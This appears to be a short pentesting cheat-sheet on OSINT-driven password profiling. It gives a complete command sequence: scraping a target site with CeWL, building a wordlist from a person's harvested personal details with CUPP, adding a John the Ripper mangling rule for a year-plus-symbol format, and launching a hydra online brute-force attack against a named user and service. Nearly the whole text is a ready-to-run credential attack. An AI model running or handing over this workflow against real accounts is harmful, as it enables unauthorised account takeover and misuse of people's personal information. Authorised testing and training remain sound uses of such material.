# OSINT-Driven Password Profiling (CeWL + CUPP + John Rules)

For an org/person whose password policy is predictable (keyword + year + symbol, etc.), build a targeted wordlist instead of brute-forcing blind:

```bash
cewl <target-url> -d 2 --with-numbers -w cewl.txt        # scrape site content for candidate keywords
cupp -i                                                    # interactive profiler from harvested personal info -> wordlist

# once you've spotted the password *format* (e.g. Capitalized + year + "!"):
# add a rule to john.conf under [List.Rules:custom]:
#   c Az"202[0-9]" $!
john --wordlist=cewl.txt --rules=custom --stdout > mangled.txt

hydra -l <USER> -P mangled.txt <TARGET> <service>
```
